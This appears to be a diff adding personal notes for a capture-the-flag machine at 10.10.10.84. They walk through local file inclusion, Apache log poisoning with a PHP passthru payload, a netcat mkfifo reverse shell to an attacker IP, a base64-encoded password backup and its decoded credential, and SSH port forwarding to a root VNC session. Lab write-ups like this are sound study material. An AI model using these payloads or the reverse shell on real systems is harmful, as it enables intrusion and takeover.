@@ -1,0 +1,63 @@
+1.nmap scan --> nmap -p- -sV -T4 10.10.10.84
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+80/tcp    open     http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+2.accessing port 80
+3.I search info.php and got this in url --> http://10.10.10.84/browse.php?file=info.php
+4.trying LFI and got the /etc/passwd file --> http://10.10.10.84/browse.php?file=../../../../../../../../../../../../../../../etc/passwd
+5. searching --> LFI to RCE php-->https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/
+finally accessing--> /var/log/httpd-access.log
+6.got the access logs --> i googled lfi to rce httpd-access.log -->https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/
+7.Reading this and trying the following things -->
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 10.10.10.84
+Connection: close
+8.we are able to see the uid using --> http://10.10.10.84/browse.php?file=../../../../../../../../../../../../../../../var/log/httpd-access.log&cmd=id using burp
+getting a reverse shell using nc --> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 1234 >/tmp/f
+9.sending the payload via burp make sure to URL encode it using ctrl+u --> 
+10.got shell as www --> 
+11.permssion denied --> user shell
+12.got this --> /usr/local/www/apache24/data/pwdbackup.txt
+It is encoded 13 times using base 64
+
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo=
+
+after decoding it from an online tool 13 times we got --> Charix!2#4%6&8(0
+13. logging in ssh --> 
+14. got user.txtfound secret.zip, let's download it to our system using scp ---> https://www.linuxtechi.com/scp-command-examples-in-linux/
+on your kali machine --> scp charix@10.10.10.84:/home/charix/secret.zip /tmp
+15.sudo zip2john secret.zip > hash
+cat hash --> secret.zip/secret:$pkzip2$1*1*2*0*14*8*77537827*0*24*0*14*7753*9827*8061b9caf8436874ad47a9481863b54443379d4c*$/pkzip2$:secret:secret.zip::secret.zip
+16.sudo john hash, running to get the password.
+
+
+17.nothing worked --> we used 'Charix!2#4%6&8(0' to unzip the file.
+we got a file named secret but nothing of use as such, now I'll go throght linpeas again 
+and got this --> port 5901 and port 5801 are port and running locally.
+googled and got to know that it is VNC -->Virtual Network Computing (VNC) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical-screen updates back in the other direction, over a network. 
+18.using --> ps aux and found vnc is running as root
+to check the ports.
+19.to run vnc we need port forwarding as it won't be able to run from the victim machine.
+20.using ssh port forward on your machine-->ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84
+now vnc is running on our machine locally at 5000
+accessing it --> vncviewer -passwd secret
+
+
+
+
